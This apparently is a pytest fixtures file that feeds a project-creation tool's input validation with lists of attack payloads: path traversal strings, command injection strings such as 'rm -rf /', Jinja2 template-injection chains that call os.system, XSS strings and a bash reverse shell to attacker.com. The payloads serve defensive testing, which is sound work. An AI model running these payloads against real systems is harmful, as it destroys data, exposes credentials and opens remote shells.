# ABOUTME: Security testing fixtures and configuration
# ABOUTME: Provides malicious payload generators and security-specific test utilities

"""Security testing fixtures and utilities."""

import tempfile
import shutil
from pathlib import Path
from typing import Dict, List, Any, Iterator
from unittest.mock import MagicMock

import pytest

from create_project.config.config_manager import ConfigManager


@pytest.fixture
def security_temp_dir() -> Iterator[Path]:
    """Provide a temporary directory for security tests with proper cleanup."""
    temp_path = tempfile.mkdtemp(prefix="security_test_")
    yield Path(temp_path)
    shutil.rmtree(temp_path, ignore_errors=True)


@pytest.fixture
def malicious_project_names() -> List[str]:
    """Provide common malicious project name payloads."""
    return [
        # Directory traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "../../.ssh/id_rsa",
        
        # Command injection
        "test; rm -rf /",
        "test && del /q /s C:\\*",
        "test | cat /etc/passwd",
        "test`whoami`",
        "test$(id)",
        
        # Script injection
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        
        # SQL injection attempts
        "test'; DROP TABLE users; --",
        "test' OR '1'='1",
        "test'; SELECT * FROM users WHERE 't'='t",
        
        # Null bytes and control characters
        "test\x00.txt",
        "test\n\r",
        "test\x1f\x7f",
        
        # Unicode attacks
        "test\u202e.txt",  # Right-to-left override
        "test\u2000\u2001",  # Various spaces
        "test\ufeff",  # Byte order mark
        
        # Long strings (buffer overflow attempt)
        "A" * 1000,
        "A" * 10000,
        
        # Special characters
        "test:port",
        "test|pipe",
        "test&background",
        "test;semicolon",
        "test`backtick`",
        
        # Windows reserved names
        "CON", "PRN", "AUX", "NUL",
        "COM1", "COM2", "LPT1", "LPT2",
        
        # Invalid filesystem characters
        "test<>:\"|?*",
        "test\\/",
        
        # Template injection
        "{{config.__class__.__init__.__globals__['os'].system('id')}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{%for x in ().__class__.__base__.__subclasses__()%}",
        
        # Python code injection
        "__import__('os').system('id')",
        "eval('__import__(\"os\").system(\"id\")')",
        "exec('import os; os.system(\"id\")')",
    ]


@pytest.fixture
def malicious_paths() -> List[str]:
    """Provide common malicious file path payloads."""
    return [
        # Unix path traversal
        "../../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../root/.ssh/id_rsa",
        "../../home/user/.bashrc",
        
        # Windows path traversal
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        "..\\..\\..\\boot.ini",
        "..\\..\\users\\administrator\\desktop",
        
        # Encoded path traversal
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        
        # Double encoding
        "%252e%252e%252f",
        "%25252e%25252e%25252f",
        
        # Unicode encoding
        "..%u2215..%u2215etc%u2215passwd",
        "\u002e\u002e\u002f",
        
        # Absolute paths
        "/etc/passwd",
        "/root/.ssh/id_rsa",
        "/proc/self/environ",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\boot.ini",
        "\\\\server\\share\\file.txt",
        
        # UNC paths (Windows)
        "\\\\localhost\\c$\\windows\\system32",
        "\\\\127.0.0.1\\c$\\",
        "\\\\?\\c:\\windows\\system32",
        
        # Device files (Unix)
        "/dev/null",
        "/dev/zero",
        "/dev/random",
        "/proc/version",
        "/proc/self/cmdline",
        
        # Mixed separators
        "../\\..\\/../etc/passwd",
        "..\\/../..\\etc/passwd",
        
        # Null bytes
        "../etc/passwd\x00.txt",
        "normal.txt\x00../etc/passwd",
        
        # Very long paths
        "A/" * 1000 + "test.txt",
        "../" * 1000 + "etc/passwd",
    ]


@pytest.fixture
def malicious_commands() -> List[str]:
    """Provide common command injection payloads."""
    return [
        # Command chaining
        "; rm -rf /",
        "&& del /q /s C:\\*",
        "|| cat /etc/passwd",
        "| whoami",
        
        # Command substitution
        "`whoami`",
        "$(id)",
        "${id}",
        
        # Redirection
        "> /etc/passwd",
        ">> ~/.bashrc",
        "< /etc/passwd",
        "2>&1",
        
        # Background execution
        "& sleep 10",
        "nohup sleep 100 &",
        
        # Multi-line injection
        "\nwhoami\n",
        "\r\nnet user\r\n",
        
        # Encoded injection
        "%0Aid",
        "%0D%0Awhoami",
        "%00whoami",
        
        # Script injection
        "</dev/null; whoami #",
        "' ; whoami ; echo '",
        '" ; whoami ; echo "',
        
        # Environment variable injection
        "$HOME/malicious.sh",
        "${PATH}/evil",
        "$IFS$()cat$IFS/etc/passwd",
        
        # PowerShell injection (Windows)
        "; powershell -command \"Get-Process\"",
        "& powershell.exe -encodedcommand",
        
        # Bash injection
        "; /bin/bash -c 'whoami'",
        "&& bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    ]


@pytest.fixture
def malicious_template_variables() -> Dict[str, Any]:
    """Provide malicious template variable payloads."""
    return {
        # Template injection
        "ssti_basic": "{{7*7}}",
        "ssti_advanced": "{{config.__class__.__init__.__globals__['os'].system('id')}}",
        "ssti_class_walk": "{{''.__class__.__mro__[1].__subclasses__()}}",
        "ssti_import": "{{__import__('os').system('id')}}",
        
        # Jinja2 specific
        "jinja_loop": "{%for x in ().__class__.__base__.__subclasses__()%}{{x}}{%endfor%}",
        "jinja_include": "{% include '/etc/passwd' %}",
        "jinja_import": "{% import os %}{{ os.system('id') }}",
        "jinja_set": "{% set x = config.__class__ %}{{x}}",
        
        # Filter bypasses
        "filter_bypass_1": "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('system')('id')}}",
        "filter_bypass_2": "{{''.join(request.args.values())|safe}}",
        
        # XSS in template context
        "xss_script": "<script>alert('xss')</script>",
        "xss_event": "<img src=x onerror=alert('xss')>",
        "xss_javascript": "javascript:alert('xss')",
        
        # Code injection
        "code_exec": "__import__('os').system('id')",
        "code_eval": "eval('__import__(\"os\").system(\"id\")')",
        "code_compile": "compile('import os; os.system(\"id\")', '', 'exec')",
        
        # Path manipulation
        "path_traversal": "../../../etc/passwd",
        "path_absolute": "/etc/passwd",
        "path_null": "normal\x00../etc/passwd",
        
        # Very large values
        "large_string": "A" * 100000,
        "large_number": 10**100,
        
        # Special types
        "none_value": None,
        "empty_string": "",
        "newlines": "line1\nline2\rline3\r\nline4",
    }


@pytest.fixture
def secure_config_manager(security_temp_dir: Path) -> ConfigManager:
    """Provide a ConfigManager instance with security-focused configuration."""
    config_path = security_temp_dir / "config"
    config_path.mkdir(exist_ok=True)
    
    # Create a config manager with restricted settings
    config_manager = ConfigManager(config_path=config_path)
    
    # Override settings for security testing
    config_manager._config.project.default_location = str(security_temp_dir / "projects")
    config_manager._config.security.enable_path_validation = True
    config_manager._config.security.enable_command_validation = True
    config_manager._config.security.max_project_name_length = 100
    config_manager._config.security.allowed_project_name_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
    
    return config_manager


@pytest.fixture
def mock_subprocess_run():
    """Mock subprocess.run to prevent actual command execution in security tests."""
    with pytest.MonkeyPatch().context() as m:
        mock_run = MagicMock()
        mock_run.return_value.returncode = 0
        mock_run.return_value.stdout = "mocked output"
        mock_run.return_value.stderr = ""
        m.setattr("subprocess.run", mock_run)
        yield mock_run


@pytest.fixture
def security_test_data() -> Dict[str, Any]:
    """Provide comprehensive security test data for various attack scenarios."""
    return {
        "valid_inputs": {
            "project_names": ["test_project", "my-app", "cool_tool_2023", "MyProject"],
            "authors": ["John Doe", "jane.smith@example.com", "user123"],
            "descriptions": ["A simple test project", "My awesome application"],
            "paths": ["./projects", "projects", "test-dir"],
            "urls": ["https://github.com/user/repo", "http://example.com"],
            "versions": ["1.0.0", "0.1.0-alpha", "2.3.4-beta.1"],
        },
        "boundary_cases": {
            "max_length_name": "A" * 100,  # At the limit
            "empty_strings": ["", "   ", "\t\n"],
            "unicode_valid": ["项目", "プロジェクト", "проект"],
            "special_chars_valid": ["test-project", "test_project", "Test.Project"],
        },
        "encoding_attacks": [
            "test%00.txt",  # Null byte
            "test\u202e.txt",  # Right-to-left override
            "test\ufeff.txt",  # Byte order mark
            "test\u2000.txt",  # Unicode space
        ],
        "timing_attack_data": {
            "short_input": "a",
            "medium_input": "a" * 100,
            "long_input": "a" * 10000,
            "very_long_input": "a" * 100000,
        }
    }


@pytest.fixture(autouse=True)
def security_test_isolation(monkeypatch):
    """Automatically isolate security tests from the real filesystem and system."""
    # Mock potentially dangerous operations
    monkeypatch.setattr("os.system", lambda x: 0)
    monkeypatch.setattr("os.popen", lambda x: MagicMock())
    monkeypatch.setattr("subprocess.Popen", MagicMock)
    
    # Mock file operations that could be dangerous
    original_open = open
    def safe_open(file, mode='r', **kwargs):
        # Only allow opening files in test directories
        file_path = Path(file).resolve()
        if "/tmp/" in str(file_path) or "test" in str(file_path).lower():
            return original_open(file, mode, **kwargs)
        else:
            # Return a mock for potentially dangerous file operations
            return MagicMock()
    
    monkeypatch.setattr("builtins.open", safe_open)